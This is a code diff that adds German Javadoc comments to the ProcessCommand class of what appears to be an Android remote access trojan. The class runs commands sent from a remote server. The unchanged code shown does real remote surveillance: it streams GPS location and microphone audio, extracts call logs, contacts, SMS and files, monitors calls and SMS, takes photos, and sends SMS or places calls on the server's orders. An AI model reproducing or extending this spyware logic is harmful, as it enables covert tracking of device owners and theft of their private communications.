@@ -33,6 +33,9 @@ import my.app.Library.SMSLister;
 import my.app.Library.SMSMonitor;
 import inout.Protocol;
 
+/**
+ * In dieser Klasse werden die von dem Server kommenden Befehlen verarbeitet und die entsprechenden Aktionen ausgewählt und gestartet.
+ */
 public class ProcessCommand
 {
 	short commande;
@@ -44,6 +47,10 @@ public class ProcessCommand
 	SharedPreferences settings;
 	SharedPreferences.Editor editor;
 
+	/**
+	 *  Der Konstruktor. Besorgt sich die Settings aus der preferences.xml und die settings des Editors
+	 * @param c Der Client
+	 */
 	public ProcessCommand(ClientListener c)
 	{
 		this.client = c;
@@ -51,79 +58,138 @@ public class ProcessCommand
 		editor = settings.edit();
 	}
 
+	/**
+	 * In dieser Methode wird das Agument verarbeitet und jenachdem die entsprechende Activity/Klasse un deren Methoden aufgerufen.
+	 * @param cmd Das Argument welches von dem Server kam
+	 * @param args	Die Argumente die übergeben wurden wie z.B. Nummer oder Provider
+	 * @param chan	Der Channel
+	 */
 	public void process(short cmd, byte[] args, int chan)
 	{
+		/**
+		 * Hier werden die Klassenvariablen mit den Übergebenen Argumenten befüllt
+		 */
 		this.commande = cmd;
 		this.chan = chan;
 		this.arguments = ByteBuffer.wrap(args);
-		
+		/**
+		 * Überprüfen welches command angekommen ist.
+		 */
 		if (commande == Protocol.GET_GPS_STREAM)
 		{
+			/**
+			 * Sollte das GET_GPS_STREAM Kommando kommen so wird aus dem agruments-Array der Provider entnommen und in dem Sting provider gespeichert.
+			 */
 			String provider = new String(arguments.array());
-
+			/**
+			 * Hier wird überprüft der GPS-Sensor aktiviert ist oder ob die Ortung per Netzwerk geschehen kann, also das Gerät mit einem Netzwerk verbunden ist.
+			 * Ist dies der Fall wird die Klassen Vaiable der Klasse Client mit einem neuen GPSListener versorgt.
+			 * Sollte das Gerät nicht verbunden sein so wird ein Error gesendet.
+			 */
 			if (provider.compareTo("network") == 0 || provider.compareTo("gps") == 0) {
 				client.gps = new GPSListener(client, provider, chan);
 				client.sendInformation("Location request received");
 			}
 			else
 				client.sendError("Unknown provider '"+provider+"' for location");
-			
-		} else if (commande == Protocol.STOP_GPS_STREAM)
+		}
+		/**
+		 * Wenn es das STOP_GPS_STREAM Kommando ist, so wird der in der Klasse Client gespeicherte GPSListener gestopp, gelöscht und die Information das dies geschehen ist an die ClientKlasse gesendet.
+		 */
+		else if (commande == Protocol.STOP_GPS_STREAM)
 		{
 			client.gps.stop();
 			client.gps = null;
 			client.sendInformation("Location stopped");
-			
-		} else if (commande == Protocol.GET_SOUND_STREAM)
+		}
+		/**
+		 * Handelt es sich um das GET_SOUND_STREAM Kommando so wird die Information an den Client gesendet, ein neuer AudioStream erstellt, dieser in der Klassenvariablen der Klasse Client gespeichert
+		 * und zum Schluss noch gestartet
+		 */
+		else if (commande == Protocol.GET_SOUND_STREAM)
 		{
 			client.sendInformation("Audio streaming request received");
 			client.audioStreamer = new AudioStreamer(client, arguments.getInt(), chan);
 			client.audioStreamer.run();
-			
-		} else if (commande == Protocol.STOP_SOUND_STREAM)
+		}
+		/**
+		 * Bei dem Kommando STOP_SOUND_STREAM wird der entsprechende AudioStream der Klasse Client gestoppt, gelöscht und die Information an die Klasse Client gesendet.
+		 */
+		else if (commande == Protocol.STOP_SOUND_STREAM)
 		{
 			client.audioStreamer.stop();
 			client.audioStreamer = null;
 			client.sendInformation("Audio streaming stopped");
-			
-		} else if (commande == Protocol.GET_CALL_LOGS)
+		}
+		/**
+		 * Der Befehl GET_CALL_LOGS ruft die listCallLog Funktion der Klasse CAllLogListener.
+		 * Sollte hier der Ergebnis Boolean false sein so wird ein Error gesendet, welcher besagt, dass keine CallLogs vorhanden sind.
+		 */
+		else if (commande == Protocol.GET_CALL_LOGS)
 		{
 			client.sendInformation("Call log request received");
 			if (!CallLogLister.listCallLog(client, chan, arguments.array()))
 				client.sendError("No call logs");
-
-		} else if (commande == Protocol.MONITOR_CALL)
+		}
+		/**
+		 * Der Befehl MONITOR_CALL übergibt der Klassenvaiablen der Klasse Client ein neues Objekt der Klasse CallMonitor.
+		 */
+		else if (commande == Protocol.MONITOR_CALL)
 		{
 			client.sendInformation("Start monitoring call");
 			client.callMonitor = new CallMonitor(client, chan, arguments.array());
-			
-		} else if (commande == Protocol.STOP_MONITOR_CALL)
+		}
+		/**
+		 * Der Befehl STOP_MONITO_CALL beendet den client.callsMonitor, löscht diesen und sendet dei Information an den client
+		 */
+		else if (commande == Protocol.STOP_MONITOR_CALL)
 		{
 			client.callMonitor.stop();
 			client.callMonitor = null;
 			client.sendInformation("Call monitoring stopped");
 			
-		} else if (commande == Protocol.GET_CONTACTS)
+		}
+		/**
+		 * Der Befehlt GET_CONTACTS ruft die listContacts-Methode der Klasse ContactsLister auf.
+		 * Sollte diese false returnen so wird einen Error Nachricht gesendet, dass es keine Kontakte auf dem Gerät gibt.
+		 */
+		else if (commande == Protocol.GET_CONTACTS)
 		{
 			client.sendInformation("Contacts request received");
 			if (!ContactsLister.listContacts(client, chan, arguments.array()))
 				client.sendError("No contact to return");
 			
-		} else if (commande == Protocol.LIST_DIR)
+		}
+		/**
+		 * Der Befehl LIST_DIR bekommt zusätzlich in dem arguments-Array den Ordner übergeben von welchem die Daten empfangen werden sollen.
+		 * Dieser Ordnername wird in dem String file zwischen gespeichert. Danach wird die listDir-Methode der Klasse DirLister aufgerufen.
+		 * Sollte diese false returnen wird eine Fehlernachricht geschickt.
+		 */
+		else if (commande == Protocol.LIST_DIR)
 		{
 			client.sendInformation("List directory request received");
 			String file = new String(arguments.array());
 			if (!DirLister.listDir(client, chan, file))
 				client.sendError("Directory: "+file+" not found");
 			
-		} else if (commande == Protocol.GET_FILE)
+		}
+		/**
+		 * Bei dem Befehl GET_FILE wird der Ordner per arguments-Array übergeben.
+		 * Danach wird ein neues Objekt der Klasse FileDownloader erzeugt und auf diesem die Methode downloadFile aufgerufen.
+		 */
+		else if (commande == Protocol.GET_FILE)
 		{
 			String file = new String(arguments.array());
 			client.sendInformation("Download file "+file+" request received");
 			client.fileDownloader = new FileDownloader(client);
 			client.fileDownloader.downloadFile(file, chan);
 			
-		} else if (commande == Protocol.GET_PICTURE)
+		}
+		/**
+		 * Mit dem Befehl GET_PICTURE wird ein Objekt der Klasse PhotoTaker erstellt und die Methode takePhoto aufgerufen.
+		 * Wird false zurückgelifert so wird eine Fehlernachricht gesendet.
+		 */
+		else if (commande == Protocol.GET_PICTURE)
 		{
 			client.sendInformation("Photo picture request received");
 			//if(client instanceof Client)
@@ -132,16 +198,30 @@ public class ProcessCommand
 			if (!client.photoTaker.takePhoto())
 				client.sendError("Something went wrong while taking the picture");
 			
-		} else if (commande == Protocol.DO_TOAST)
+		}
+		/**
+		 * Der Befehl DO_TOAST erzuegt ein neuen Toast mit dem Text, welcher in dem arguments-Array übergeben wird.
+		 * Danach wird dieser mit dem Aufruf der Funktion show auf dem Gerät angezeigt.
+		 */
+		else if (commande == Protocol.DO_TOAST)
 		{
 			client.toast = Toast.makeText(client, new String(arguments.array()), Toast.LENGTH_LONG);
 			client.toast.show();
 			
-		} else if (commande == Protocol.SEND_SMS)
+		}
+		/**
+		 * Bei dem Befehl SEND_SMS wird aus dem arguments-Array die Nummer und der Sms-Body extrahiert und diese in den Variablen num und text gespeichtert.
+		 */
+		else if (commande == Protocol.SEND_SMS)
 		{
 			Map<String, String> information = EncoderHelper.decodeHashMap(arguments.array());
 			String num = information.get(Protocol.KEY_SEND_SMS_NUMBER);
 			String text = information.get(Protocol.KEY_SEND_SMS_BODY);
+			/**
+			 * Hier wird die Länge überprüft. Sollte diese Länger als 167 Byte haben so müssen mehrere SMS gesendet werden.
+			 * Dies wird dann mit dem Aufruf der Methode sendMultipartTextMessage getan.
+			 * Sollte die Länge passen wird die Methode sendTextMessage aufgerufen.
+			 */
 			if (text.getBytes().length < 167)
 				SmsManager.getDefault().sendTextMessage(num, null, text, null, null);
 			else
@@ -151,59 +231,105 @@ public class ProcessCommand
 			}
 			client.sendInformation("SMS sent");
 
-		} else if (commande == Protocol.GIVE_CALL)
+		}
+		/**
+		 * Dieser Teil wird ausgeführt wenn der Befehlt GIVE_CALL gesendet wurde.
+		 * Hier wird aus dem arguments-Array die Telefonnummer extrahiert und der String tel: davor eingefügt.
+		 * Dieser String kann dann benutzt werden um einen Intent zu erstellen, welcher die action ACTION_CALL übergeben bekommt.
+		 * Zusätzlich wird die FLAG_ACTIVITY_NEW_TASK gesetzt. Im Anschluss wird der Intent gesendet und somit der Anruf getätigt.
+		 */
+		else if (commande == Protocol.GIVE_CALL)
 		{
 			 String uri = "tel:" + new String(arguments.array()) ;
 			 intent = new Intent(Intent.ACTION_CALL,Uri.parse(uri));
 			 intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 			 client.startActivity(intent);
 			 
-		} else if (commande == Protocol.GET_SMS)
+		}
+		/**
+		 * Sollte der Befehl GET_SMS gesendet werden so wird die Methode listSMS der Klasse SMSLIster aufgerufen und das arguments_array wird dieser Methode übergeben.
+		 * Diese fungieren hier als die Filter, welche der Benutzer eingeben kann. Sollte hier als Resultat false geliefert werden so gab es keine SMS die auf diesen Filter zutreffen.
+		 */
+		else if (commande == Protocol.GET_SMS)
 		{
 			client.sendInformation("SMS list request received");
 			if(!SMSLister.listSMS(client, chan, arguments.array()))
 				client.sendError("No SMS match for filter");
 			
-		} else if (commande == Protocol.MONITOR_SMS)
+		}
+		/**
+		 * Mit dem Befehl MONITOR_SMS  wird ein neues Objekt der Klasse SMSMonitor erstellt und der Klassenvaribale der Client Klasse zugewiesen.
+		 */
+		else if (commande == Protocol.MONITOR_SMS)
 		{
 			client.sendInformation("Start SMS monitoring");
 			client.smsMonitor = new SMSMonitor(client, chan, arguments.array());
 			
-		} else if (commande == Protocol.STOP_MONITOR_SMS)
+		}
+		/**
+		 * Sollt der Befehl STOP_MONITOR_SMS empfangen werden so wird das smsMonitor Objekt gestoppt und gelöscht.
+		 */
+		else if (commande == Protocol.STOP_MONITOR_SMS)
 		{
 			client.smsMonitor.stop();
 			client.smsMonitor = null;
 			client.sendInformation("SMS monitoring stopped");
 		}
+		/**
+		 * Wird der Befehl GET_PREFERENCE gesendet so sendet der Client die Preferences an den Server.
+		 * Hierzu wird der Befehel handleData aufgerufen.
+		 */
 		else if (commande == Protocol.GET_PREFERENCE)
 		{
 			client.handleData(chan, loadPreferences().build());
-		} 
+		}
+		/**
+		 * Mit dem Befehel SET_PREFERENCE werden die gesendeten PREFERENCES gespeichtert, indem die Methode savePreferences aufgerufen wird.
+		 * Das arguments-Array bietet hier die entsprechenden zu speichernden Daten an.
+		 */
 		else if (commande == Protocol.SET_PREFERENCE)
 		{
 			client.sendInformation("Preferences received");
 			savePreferences(arguments.array());
 			client.loadPreferences(); //Reload the new config for the client
 		}
+		/**
+		 * Der Befehl GET_ADV_INFOMATIONS erstellt ein Obejekt der Klasse AdvancedSystemInfo und ruft auf diesem die Methode getInfos() auf.
+		 */
 		else if(commande == Protocol.GET_ADV_INFORMATIONS) {
 			client.advancedInfos = new AdvancedSystemInfo(client, chan);
 			client.advancedInfos.getInfos();
 		}
+		/**
+		 * Durch den Befehl OPEN_BROWSER wird ein neuer Intent erstellt, welcher die url, die aus dem arguments-Array extrahiert wurde,
+		 * und die Action ACTION_VIEW erhält. Zusätzlich wird die FLAG_ACTIVITY_NEW_TASK gesetzt.
+		 * Im Anschluss wird der Intent abgeschickt und somit die Activity die ihn empfängt gestartet.
+		 */
 		else if(commande == Protocol.OPEN_BROWSER) {
 			 String url = new String(arguments.array()) ;
 			 Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
 			 i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 			 client.startActivity(i);
 		}
+		/**
+		 * Sollter der Befehel DO_VIBRATE gesendet werden so wird ein neuer Vibrator_service erstellt.
+		 * Das arguments-Array liefert wie lange das Gerät vibrieren soll. Durch den Aufruf der Methdoe virbrate wird dies dann ausgeführt.
+		 */
 		else if(commande == Protocol.DO_VIBRATE) {
 			Vibrator v = (Vibrator) client.getSystemService(Context.VIBRATOR_SERVICE);
 			long duration = arguments.getLong();
 			v.vibrate(duration);
 
 		}
+		/**
+		 * Mit dem Befehl DISCONNECT wird der Service client zerstört und somit das Programm beendet.
+		 */
 		else if(commande == Protocol.DISCONNECT) {
 			client.onDestroy();
 		}
+		/**
+		 * Mit der letzen Abfrage werden unbekannte Befehle abgefangen und ein Error gesendet.
+		 */
 		else {
 			client.sendError("Command: "+commande+" unknown");
 		}
